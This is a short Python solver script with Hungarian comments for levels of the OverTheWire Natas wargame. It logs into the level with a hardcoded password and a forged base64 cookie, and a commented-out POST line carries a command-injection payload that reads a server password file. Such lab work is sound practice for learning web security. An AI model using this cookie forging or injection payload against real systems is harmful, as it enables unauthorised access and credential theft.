from urllib import response

#3.9 pythonnal megy!!
import urllib
import requests
import re
import base64

from traitlets import default


username = 'natas11'
password = '1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg'

goodCookieData = { "data" : "MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz"}
#headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}
url = 'http://%s.natas.labs.overthewire.org/' % username
session = requests.Session()
reponse = session.get(url , auth=(username, password),cookies=goodCookieData)

#POST request
#reponse = requests.post(url, data={"needle": ". cat /etc/natas_webpass/natas11 #","submit": "submit"}, auth=(username, password))

#a sessionhoz hozzarendelt get keres
#reponse = session.get(url, auth=(username, password), cookies=cookie_)

content = reponse.text

#indexelni is lehet
#print(session.cookies['loggedin'])

#kereses a tartalomban. A (.*) a helyettesito karakter. ami itt van az eredetiban azt figyelman kivul fogja hagyni.
#print(re.findall('natas11(.*)' ,content))

print(content)